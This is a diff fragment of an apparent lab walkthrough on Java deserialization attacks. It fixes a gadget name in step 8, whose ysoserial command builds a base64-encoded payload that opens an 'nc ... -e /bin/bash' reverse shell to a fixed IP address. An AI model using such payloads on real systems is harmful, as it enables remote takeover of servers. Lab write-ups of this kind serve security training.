@@ -39,7 +39,7 @@ java -jar ysoserial-master-SNAPSHOT.jar
 
 **Step 8:** Capture the IP address and use that to generate the reverse shell payload using following command and capture the generated payload.<br />
 ```
-java -jar ysoserial-master-SNAPSHOT.jar CommonCollections4 "nc 192.168.29.88 4444 -e /bin/bash" | base64 -w 0
+java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nc 192.168.29.88 4444 -e /bin/bash" | base64 -w 0
 ```
 <kbd> <img src="8.png" /> </kbd>
 <br /> <br />
